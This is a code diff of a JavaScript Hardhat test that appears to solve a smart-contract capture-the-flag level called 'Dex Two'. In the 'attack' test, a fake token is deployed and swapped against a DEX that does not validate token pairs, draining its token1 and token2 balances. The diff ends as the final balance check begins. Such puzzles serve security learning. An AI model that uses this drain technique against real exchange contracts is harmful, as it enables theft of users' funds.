@@ -58,23 +58,44 @@ describe('Dex2', () => {
     await Promise.all([tx1.wait(), tx2.wait(), tx3.wait(), tx4.wait()]);
   });
 
-  function connectedDex() {
-    return dex.connect(attacker);
-  }
-
   it('attack', async () => {
-    const TokenFactory = await ethers.getContractFactory('SwappeableTokenTwo');
-    const INITIAL_SUPPLY = utils.parseEther('1000000000000');
-    const fakeToken = await TokenFactory.connect(attacker).deploy(
-      attacker.address,
+    const FakeTokenFactory = await ethers.getContractFactory(
+      'FakeSwappableTokenTwo'
+    );
+
+    const INITIAL_SUPPLY = utils.parseEther('1000000');
+    const fakeToken = await FakeTokenFactory.connect(attacker).deploy(
       'FakeToken',
-      'FKE',
+      'FTK',
       INITIAL_SUPPLY
     );
     await fakeToken.deployed();
 
     let tx;
     tx = await fakeToken.connect(attacker).approve(dex.address, INITIAL_SUPPLY);
+    await tx.wait();
+
+    tx = await dex
+      .connect(attacker)
+      .approve(dex.address, utils.parseEther('10'));
+    await tx.wait();
+
+    // SEND TOKENS TO DEX
+    tx = await fakeToken
+      .connect(attacker)
+      .transfer(dex.address, utils.parseEther('1'));
+    await tx.wait();
+
+    // GET ALL OF TOKEN1 BALANCE
+    tx = await dex
+      .connect(attacker)
+      .swap(fakeToken.address, token1.address, utils.parseEther('1'));
+    await tx.wait();
+
+    // GET ALL OF TOKEN2 BALANCE
+    tx = await dex
+      .connect(attacker)
+      .swap(fakeToken.address, token2.address, utils.parseEther('2'));
     await tx.wait();
 
     const [dexToken1Balance, dexToken2Balance] = await Promise.all([
